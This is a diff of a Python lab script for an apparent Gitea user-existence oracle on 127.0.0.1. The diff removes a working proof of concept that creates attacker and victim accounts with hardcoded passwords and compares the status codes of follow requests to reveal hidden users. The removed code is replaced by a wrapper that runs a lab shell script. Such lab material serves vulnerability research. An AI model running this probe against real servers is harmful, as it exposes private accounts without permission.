@@ -222,145 +222,21 @@ def _cprint(*args, **kwargs):
 print_abraxas_banner()
 _builtins.print = _cprint
 
-from __future__ import annotations
+"""Gitea <= 1.27.3 Follow 204 vs 404 existence oracle. Loopback lab wrapper."""
 
-import base64
-import json
-import ssl
+import subprocess
 import sys
-import urllib.error
-import urllib.request
+from pathlib import Path
 
-BASE = (sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:18134").rstrip("/")
-ADMIN = ("labadmin", "LabPass123!")
-ATTACKER = ("attacker", "LabPass123!")
-VICTIM = "hiddenlimited"
-PUBLIC = "publicprobe"
-UNKNOWN = "no-such-user-xyz"
-PASS = "LabPass123!"
-CTX = ssl._create_unverified_context()
+HERE = Path(__file__).resolve().parent
+LAB = HERE / "lab"
 
 
-def req(method: str, path: str, data: dict | None = None, auth: tuple[str, str] | None = None) -> tuple[int, str]:
-    hdrs = {"Content-Type": "application/json", "User-Agent": "gitea-follow-existence-lab"}
-    if auth:
-        tok = base64.b64encode(f"{auth[0]}:{auth[1]}".encode()).decode()
-        hdrs["Authorization"] = "Basic " + tok
-    body = None if data is None else json.dumps(data).encode()
-    r = urllib.request.Request(BASE + path, data=body, headers=hdrs, method=method)
-    try:
-        with urllib.request.urlopen(r, timeout=30, context=CTX) as resp:
-            return resp.status, resp.read().decode("utf-8", "replace")
-    except urllib.error.HTTPError as exc:
-        return exc.code, exc.read().decode("utf-8", "replace")
-
-
-def create_or_patch(username: str, payload: dict, patch: dict) -> None:
-    s, b = req("POST", "/api/v1/admin/users", payload, auth=ADMIN)
-    print(f"IOC create user={username} status={s} snippet={b[:160]!r}")
-    if s in (201, 200):
-        return
-    if s not in (409, 422):
-        print(f"FAIL admin create {username}")
-        raise SystemExit(1)
-    s, b = req("PATCH", f"/api/v1/admin/users/{username}", patch, auth=ADMIN)
-    print(f"IOC patch user={username} status={s} snippet={b[:160]!r}")
-    if s != 200:
-        print(f"FAIL admin patch {username}")
-        raise SystemExit(1)
-
-
-def seed() -> None:
-    s, b = req("GET", "/api/v1/user", auth=ADMIN)
-    print(f"IOC admin-self status={s} snippet={b[:120]!r}")
-    if s != 200:
-        print("FAIL admin login")
-        raise SystemExit(1)
-
-    create_or_patch(
-        VICTIM,
-        {
-            "username": VICTIM,
-            "email": f"{VICTIM}@localhost.invalid",
-            "password": PASS,
-            "must_change_password": False,
-            "visibility": "limited",
-        },
-        {"source_id": 0, "visibility": "limited", "must_change_password": False},
-    )
-    create_or_patch(
-        ATTACKER[0],
-        {
-            "username": ATTACKER[0],
-            "email": f"{ATTACKER[0]}@localhost.invalid",
-            "password": PASS,
-            "must_change_password": False,
-            "restricted": True,
-            "visibility": "public",
-        },
-        {"source_id": 0, "restricted": True, "visibility": "public", "must_change_password": False},
-    )
-    create_or_patch(
-        PUBLIC,
-        {
-            "username": PUBLIC,
-            "email": f"{PUBLIC}@localhost.invalid",
-            "password": PASS,
-            "must_change_password": False,
-            "visibility": "public",
-        },
-        {"source_id": 0, "visibility": "public", "must_change_password": False},
-    )
-
-
-def main() -> None:
-    print(f"IOC base={BASE}")
-    s, b = req("GET", "/api/v1/version")
-    print(f"IOC version status={s} snippet={b[:120]!r}")
-    if s != 200:
-        print("FAIL version")
-        raise SystemExit(1)
-
-    seed()
-
-    s_pub, b_pub = req("GET", f"/api/v1/users/{PUBLIC}", auth=ATTACKER)
-    print(f"IOC get-public status={s_pub} snippet={b_pub[:160]!r}")
-    if s_pub != 200:
-        print("FAIL restricted attacker cannot see public user")
-        raise SystemExit(1)
-
-    s_get, b_get = req("GET", f"/api/v1/users/{VICTIM}", auth=ATTACKER)
-    print(f"IOC get-hidden status={s_get} snippet={b_get[:160]!r}")
-    if s_get != 404:
-        print("FAIL hidden user profile was visible (expected 404)")
-        raise SystemExit(1)
-
-    s_admin, _ = req("GET", f"/api/v1/users/{VICTIM}", auth=ADMIN)
-    print(f"IOC get-hidden-as-admin status={s_admin}")
-    if s_admin != 200:
-        print("FAIL victim does not exist for admin")
-        raise SystemExit(1)
-
-    s_hit, b_hit = req("PUT", f"/api/v1/user/following/{VICTIM}", auth=ATTACKER)
-    print(f"IOC follow-hidden status={s_hit} snippet={b_hit[:160]!r}")
-
-    s_miss, b_miss = req("PUT", f"/api/v1/user/following/{UNKNOWN}", auth=ATTACKER)
-    print(f"IOC follow-unknown status={s_miss} snippet={b_miss[:160]!r}")
-
-    hidden_ok = s_hit in (204, 201, 200)
-    unknown_404 = s_miss == 404
-    print(f"IOC oracle hidden={s_hit} unknown={s_miss}")
-
-    if hidden_ok and unknown_404:
-        print("SUCCESS GITEA-FOLLOW-ORACLE")
-        return
-    if s_hit == 404 and s_miss == 404:
-        print("FAIL both follow targets 404 (Follow checks visibility or assignment hides)")
-        raise SystemExit(1)
-    print(f"FAIL unexpected follow statuses hidden={s_hit} unknown={s_miss}")
-    raise SystemExit(1)
+def main() -> int:
+    completed = subprocess.run(["bash", str(LAB / "run.sh"), *sys.argv[1:]], cwd=LAB)
+    return int(completed.returncode)
 
 
 if __name__ == "__main__":
-    main()
+    raise SystemExit(main())
 
